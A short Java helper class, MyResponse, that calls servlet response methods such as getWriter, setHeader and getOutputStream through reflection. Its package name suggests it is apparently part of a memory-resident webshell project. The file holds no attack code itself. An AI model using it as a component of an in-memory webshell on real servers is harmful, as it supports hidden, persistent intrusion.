package net.rebeyond.memshell.redefine;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;

public class MyResponse {
	public static void setContentType(Object response,String arg) throws Exception
	{
		response.getClass().getMethod("setContentType", String.class).invoke(response, arg);
	}
	public static void setCharacterEncoding(Object response,String arg) throws Exception
	{
		response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, arg);
	}
	public static PrintWriter getWriter(Object response) throws Exception
	{
		return (PrintWriter)response.getClass().getMethod("getWriter",null).invoke(response, new Object[] {});
	}
	
	public static void reset(Object response) throws Exception
	{
		response.getClass().getMethod("reset", null).invoke(response, new Object[] {});
	}
	
	public static Object getOutputStream(Object response) throws Exception
	{
		return response.getClass().getMethod("getOutputStream", null).invoke(response, new Object[] {});
	}
	public static void setHeader(Object response,String arg1,String arg2) throws Exception
	{
		response.getClass().getMethod("setHeader", String.class, String.class).invoke(response, arg1,arg2);
	}
	
}
